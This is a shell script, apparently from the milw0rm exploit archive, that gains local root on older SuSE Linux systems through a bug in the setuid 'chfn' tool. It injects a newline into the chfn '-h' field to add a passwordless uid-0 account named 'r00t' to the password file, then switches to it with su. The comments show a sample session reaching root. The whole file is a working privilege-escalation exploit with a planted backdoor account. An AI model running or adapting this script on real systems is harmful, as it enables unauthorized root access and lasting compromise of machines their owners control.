#!/bin/sh
#
# Exploit for SuSE Linux 9.{1,2,3}/10.0, Desktop 1.0, UnitedLinux 1.0
# and SuSE Linux Enterprise Server {8,9} 'chfn' local root bug.
#
# by Hunger <susechfn@hunger.hu>
#
# Advistory:
# http://lists.suse.com/archive/suse-security-announce/2005-Nov/0002.html
#
# hunger@suse:~> id
# uid=1000(hunger) gid=1000(hunger) groups=1000(hunger)
# hunger@suse:~> ./susechfn.sh
# Type your current password to get root... :)
# Password:
# sh-2.05b# id
# uid=0(r00t) gid=0(root) groups=0(root)

if [ X"$SHELL" = "X" ]; then
	echo "No SHELL environment, using /bin/sh for default."
	export SHELL=/bin/sh
fi

if [ -u /usr/bin/chfn ]; then
	/bin/echo "Type your current password to get root... :)"
	/usr/bin/chfn -h "`echo -e ':/:'$SHELL'\nr00t::0:0:'`" $USER > /dev/null
	if [ -u /bin/su ]; then
		/bin/su r00t
		/bin/echo "You can get root again with 'su r00t'"
	else
		echo "/bin/su file is not setuid root :("
	fi
else
echo "/usr/bin/chfn file is not setuid root :("
fi

# milw0rm.com [2005-11-08]